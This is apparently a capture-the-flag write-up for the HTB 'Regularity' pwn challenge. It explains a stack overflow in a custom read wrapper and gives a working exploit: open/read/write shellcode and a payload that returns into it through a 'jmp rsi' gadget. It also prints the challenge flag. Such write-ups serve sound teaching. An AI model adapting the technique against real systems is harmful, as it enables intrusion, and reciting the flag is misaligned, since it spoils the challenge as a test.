# Regularity

**Event:** HTB MCP TryOut · **Category:** pwn · **Difficulty:** very easy

## TL;DR

Static binary, no PIE, NX off, RWX segments. The `read` wrapper reserves a 0x100 buffer but reads 0x110 bytes, giving a sixteen-byte overflow past the saved RIP. The wrapper sets `rsi` to point at the buffer and never clobbers it. There is a `jmp rsi` gadget in the binary, so you write shellcode at the start of the buffer, set the saved RIP to the gadget, and `ret` lands you in your own code.

## What I saw first

```
sub rsp, 0x100
lea rsi, [rsp]
mov edx, 0x110          # reads 0x110 into a 0x100 buffer
syscall                 # read(0, rsp, 0x110)
add rsp, 0x100
ret
```

`rsi` still points at the buffer when `ret` fires. The buffer is at the same address every run because there is no ASLR. `jmp rsi` exists at `0x401041` in the same binary.

## What I tried that did not work

Tried `ret2libc` first out of habit. There is no libc; the binary is fully static, so no PLT, no useful libc symbols. Wasted a few minutes before remembering RWX segments means shellcode in the buffer just works.

## What worked

```python
shellcode = asm("""
    mov rax, 0x7478742e67616c66 ; push rax ; mov rdi, rsp
    xor esi, esi ; xor edx, edx ; mov eax, 2 ; syscall   ; open("flag.txt", 0)
    mov rdi, rax ; mov rsi, rsp ; mov edx, 0x100 ; xor eax, eax ; syscall  ; read
    mov edx, eax ; mov edi, 1 ; mov rsi, rsp ; mov eax, 1 ; syscall        ; write
    mov eax, 60 ; xor edi, edi ; syscall
""")
payload = shellcode.ljust(0x100, b"\x90") + p64(0x401041) + b"\x00"*8
```

## Flag

`HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_15e4741cf3c51df6c2e3cfeb5d414e91}`

## What this taught me

A custom `read` function that does `lea rsi, [rsp]` and returns without touching `rsi` hands you a stack-pivot-free `ret2shellcode` primitive. The gadget you want is `jmp rsi` (or `call rsi`), and it shows up in the binary itself with no ASLR-bypass needed. Always check the wrapper's register state on return, not just its overflow length.
